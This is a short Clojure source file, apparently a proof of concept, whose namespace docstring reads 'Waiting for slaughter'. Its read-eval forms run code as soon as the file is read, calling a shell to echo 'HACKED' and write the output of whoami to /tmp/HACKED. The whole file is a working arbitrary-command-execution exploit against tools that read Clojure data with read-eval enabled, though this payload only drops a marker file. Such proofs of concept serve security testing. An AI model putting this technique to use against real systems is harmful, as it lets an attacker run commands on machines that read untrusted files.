(ns lamb
  "Waiting for slaughter"
  )
  
#=(println "Running code")

#=(eval '(do
	(use '[clojure.java.shell :only [sh]])
	(map println (clojure.string/split (:out (clojure.java.shell/sh "sh" "-c" "echo 'HACKED' && whoami > /tmp/HACKED")) #"\n"))
))
